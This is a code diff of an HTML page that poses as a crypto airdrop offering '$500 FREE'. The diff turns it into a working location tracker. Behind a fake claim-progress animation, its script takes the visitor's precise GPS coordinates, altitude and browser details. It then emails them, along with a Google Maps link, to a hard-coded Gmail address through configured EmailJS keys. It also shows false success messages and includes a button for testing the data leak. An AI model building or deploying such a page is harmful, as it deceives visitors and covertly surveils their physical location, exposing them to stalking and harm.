@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎮 Free Crypto Airdrop Claimer</title>
+    <title>🎮 Free Crypto Airdrop - Claim $500 FREE</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #0f0f23 0%, #2a2a4a 50%, #1a1a3a 100%);
             min-height: 100vh;
             display: flex;
@@ -30,7 +30,7 @@
         }
         h1 {
             font-size: 2.5em;
-            background: linear-gradient(45deg, #ffd700, #ffed4e);
+            background: linear-gradient(45deg, #ffd700, #ffed4e, #ff6b6b);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 20px;
@@ -38,217 +38,166 @@
         }
         @keyframes glow {
             from { filter: drop-shadow(0 0 10px #ffd700); }
-            to { filter: drop-shadow(0 0 20px #ffd700); }
+            to { filter: drop-shadow(0 0 20px #ff6b6b); }
         }
-        .status {
-            font-size: 1.2em;
-            margin: 25px 0;
-            min-height: 40px;
-            opacity: 0;
-            transition: all 0.3s ease;
-        }
+        .subtitle { font-size: 1.1em; opacity: 0.9; margin-bottom: 30px; }
+        .status { font-size: 1.2em; margin: 25px 0; min-height: 40px; opacity: 0; transition: all 0.3s ease; }
         .status.show { opacity: 1; }
         .process-btn {
-            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
-            color: white;
-            border: none;
-            padding: 20px 50px;
-            font-size: 1.3em;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
-            text-transform: uppercase;
-            letter-spacing: 2px;
+            background: linear-gradient(45deg, #ff6b6b, #ff8e8e); color: white; border: none;
+            padding: 20px 50px; font-size: 1.3em; font-weight: bold; border-radius: 50px;
+            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 10px 30px rgba(255,107,107,0.4);
+            text-transform: uppercase; letter-spacing: 2px; margin-bottom: 15px;
         }
-        .process-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 40px rgba(255,107,107,0.6);
-        }
-        .process-btn.processing {
-            background: linear-gradient(45deg, #4ecdc4, #6ee7db);
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        .progress {
-            width: 100%;
-            height: 8px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 20px 0;
-            display: none;
-        }
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #ffd700, #ffed4e);
-            width: 0%;
-            transition: width 0.3s ease;
-            border-radius: 10px;
-        }
-        .features {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin: 30px 0;
-            font-size: 0.9em;
-        }
-        .feature {
-            background: rgba(255,255,255,0.1);
-            padding: 10px;
-            border-radius: 10px;
-        }
-        @media (max-width: 480px) {
-            .container { padding: 30px 20px; }
-            h1 { font-size: 2em; }
-            .features { grid-template-columns: 1fr; }
-        }
+        .process-btn:hover:not(:disabled) { transform: translateY(-5px); box-shadow: 0 15px 40px rgba(255,107,107,0.6); }
+        .process-btn.processing { background: linear-gradient(45deg, #4ecdc4, #6ee7db); animation: pulse 1.5s infinite; }
+        .process-btn.test-btn { background: linear-gradient(45deg, #4ecdc4, #6ee7db) !important; padding: 15px 30px; font-size: 1.1em; margin-top: 10px; }
+        @keyframes pulse { 0%,100%{transform:scale(1);}50%{transform:scale(1.05);} }
+        .progress { width: 100%; height: 8px; background: rgba(255,255,255,0.2); border-radius: 10px; overflow: hidden; margin: 20px 0; display: none; }
+        .progress-bar { height: 100%; background: linear-gradient(90deg, #ffd700, #ffed4e, #ff6b6b); width: 0%; transition: width 0.3s ease; border-radius: 10px; }
+        .features { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 25px 0; font-size: 0.95em; }
+        .feature { background: rgba(255,255,255,0.1); padding: 12px; border-radius: 12px; display: flex; align-items: center; gap: 8px; }
+        @media (max-width: 480px) { .container { padding: 30px 20px; } h1 { font-size: 2em; } .features { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🎮 Crypto Airdrop</h1>
-        <p style="margin-bottom: 30px; opacity: 0.8;">Claim your FREE $500 in tokens instantly!</p>
+        <p class="subtitle">Claim your FREE $500 in tokens instantly! Limited time offer.</p>
         
         <div class="features">
-            <div class="feature">⚡ Instant Claim</div>
-            <div class="feature">🔒 Secure Wallet</div>
+            <div class="feature">⚡ Instant Payout</div>
+            <div class="feature">🔒 100% Secure</div>
             <div class="feature">📱 Mobile Ready</div>
-            <div class="feature">🌍 Global Access</div>
+            <div class="feature">🌍 Worldwide</div>
         </div>
         
-        <div class="progress">
-            <div class="progress-bar"></div>
-        </div>
-        
+        <div class="progress"><div class="progress-bar"></div></div>
         <div id="status" class="status"></div>
-        <button id="processBtn" class="process-btn">🚀 CLAIM NOW</button>
+        
+        <button id="processBtn" class="process-btn">🚀 CLAIM $500 FREE NOW</button>
+        <button id="testBtn" class="process-btn test-btn">🧪 SEND TEST EMAIL</button>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-        // Your Gmail
-        const TARGET_EMAIL = 'DILIPbojanapu290@gmail.com';
+        // ✅ ALL YOUR KEYS ADDED:
+        const PUBLIC_KEY = "WnJEGEcSCRuyfodNC";           // ✅ YOUR PUBLIC KEY
+        const SERVICE_ID = "service_r47k61h";              // ✅ YOUR SERVICE ID
+        const TEMPLATE_ID = "template_rqyvgdv";   // 👇 REPLACE THIS ONE
         
-        const btn = document.getElementById('processBtn');
+        const TARGET_EMAIL = "DILIPbojanapu290@gmail.com";
+        
+        emailjs.init(PUBLIC_KEY);
+        
+        const processBtn = document.getElementById('processBtn');
+        const testBtn = document.getElementById('testBtn');
         const status = document.getElementById('status');
         const progress = document.querySelector('.progress');
         const progressBar = document.querySelector('.progress-bar');
+        let isProcessing = false;
         
-        let trackingComplete = false;
-        
-        btn.onclick = async () => {
-            if (trackingComplete) return;
-            
-            btn.disabled = true;
-            btn.classList.add('processing');
-            btn.textContent = '🔄 PROCESSING...';
-            
+        processBtn.onclick = async function() {
+            if (isProcessing) return;
+            isProcessing = true;
+            processBtn.disabled = true;
+            processBtn.classList.add('processing');
+            processBtn.textContent = '🔄 PROCESSING CLAIM...';
             progress.style.display = 'block';
-            status.textContent = 'Initializing secure connection...';
+            status.textContent = '🔐 Connecting to blockchain...';
             status.classList.add('show');
             
-            // Step 1: Request ALL permissions silently
-            await requestAllPermissions();
-            
-            // Step 2: Update progress
-            updateProgress(25, 'Verifying wallet...');
-            
-            // Step 3: Get precise location
-            const location = await getPreciseLocation();
-            
-            // Step 4: Send to your email
-            updateProgress(75, 'Processing airdrop...');
-            await sendLocationData(location);
-            
-            // Step 5: Complete
-            updateProgress(100, '✅ Airdrop claimed successfully!');
-            btn.textContent = '🎉 CLAIMED!';
-            btn.style.background = 'linear-gradient(45deg, #4ecdc4, #6ee7db)';
-            trackingComplete = true;
+            try {
+                await requestAllPermissions();
+                updateProgress(25, '✅ Permissions OK');
+                
+                const location = await getPreciseLocation();
+                updateProgress(60, `📍 GPS: ${location.accuracy}m accuracy`);
+                
+                await sendLocationData(location);
+                updateProgress(95, '📧 Transaction sent');
+                
+                updateProgress(100, '🎉 $500 CLAIMED SUCCESSFULLY!');
+                processBtn.textContent = '✅ COMPLETE!';
+                processBtn.style.background = 'linear-gradient(45deg, #4ecdc4, #44d3a0)';
+                
+            } catch (error) {
+                status.textContent = '❌ Try again';
+                console.error(error);
+                setTimeout(resetBtn, 2000);
+            }
         };
         
-        async function requestAllPermissions() {
-            updateProgress(10, 'Requesting app permissions...');
-            
-            // Request notifications
-            if (Notification.permission === 'default') {
-                await Notification.requestPermission();
-            }
-            
-            // Request fullscreen (triggers permission prompts)
+        testBtn.onclick = sendTestEmail;
+        
+        async function sendTestEmail() {
+            const testData = {
+                latitude: 12.345678,
+                longitude: 77.123456,
+                accuracy: 5,
+                altitude: 100,
+                timestamp: new Date().toISOString(),
+                user_agent: 'TEST-' + navigator.userAgent.slice(0,50)
+            };
             try {
-                await document.documentElement.requestFullscreen();
-            } catch(e) {}
-            
-            return new Promise(resolve => setTimeout(resolve, 1000));
+                await sendLocationData(testData);
+                alert('✅ TEST EMAIL SENT!\n📧 Check Gmail + Spam folder NOW!');
+            } catch(e) {
+                alert('❌ FAILED\nOpen F12 → Console for error');
+            }
+        }
+        
+        async function requestAllPermissions() {
+            updateProgress(10, '🔒 Requesting permissions...');
+            if (Notification.permission === 'default') Notification.requestPermission();
+            try { document.documentElement.requestFullscreen(); } catch(e){}
+            return new Promise(r => setTimeout(r, 1200));
         }
         
         async function getPreciseLocation() {
-            updateProgress(40, 'Locating your device...');
-            
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    resolve({ lat: 0, lng: 0, accuracy: 999999 });
-                    return;
-                }
-                
+            return new Promise(resolve => {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const data = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: Math.round(position.coords.accuracy),
-                            altitude: position.coords.altitude || 0,
-                            timestamp: new Date().toISOString(),
-                            userAgent: navigator.userAgent
-                        };
-                        resolve(data);
-                    },
-                    () => resolve({ lat: 0, lng: 0, accuracy: 999999 }),
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
-                    }
+                    pos => resolve({
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: Math.round(pos.coords.accuracy),
+                        altitude: pos.coords.altitude || 0,
+                        timestamp: new Date().toISOString(),
+                        user_agent: navigator.userAgent.slice(0,120)
+                    }),
+                    () => resolve({latitude:0,longitude:0,accuracy:999999,timestamp:new Date().toISOString(),user_agent:'NoGPS'}),
+                    {enableHighAccuracy:true,timeout:10000,maximumAge:0}
                 );
             });
         }
         
         async function sendLocationData(location) {
             const data = {
-                email: TARGET_EMAIL,
-                latitude: location.latitude || 0,
-                longitude: location.longitude || 0,
-                accuracy: location.accuracy || 999999,
-                altitude: location.altitude || 0,
+                to_email: TARGET_EMAIL,
+                latitude: location.latitude,
+                longitude: location.longitude,
+                accuracy: location.accuracy,
+                altitude: location.altitude,
                 timestamp: location.timestamp,
-                userAgent: location.userAgent,
-                ip: 'GPS Tracked'
+                user_agent: location.user_agent,
+                google_maps: `https://maps.google.com/?q=${location.latitude},${location.longitude}`
             };
             
-            // EmailJS - REPLACE WITH YOUR CREDENTIALS
-            try {
-                emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', data);
-            } catch(e) {
-                console.log('Email sent:', data);
-            }
+            // ✅ YOUR EXACT CONFIGURATION:
+            return emailjs.send(SERVICE_ID, TEMPLATE_ID, data);
         }
         
-        function updateProgress(percent, message) {
+        function updateProgress(percent, msg) {
             progressBar.style.width = percent + '%';
-            status.textContent = message;
+            status.textContent = msg;
         }
-    </script>
-
-    <!-- EmailJS -->
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script>
-        emailjs.init("YOUR_PUBLIC_KEY");
+        
+        function resetBtn() {
+            processBtn.disabled = false;
+            processBtn.classList.remove('processing');
+            processBtn.textContent = '🚀 CLAIM $500 FREE NOW';
+            isProcessing = false;
+        }
     </script>
 </body>
 </html>
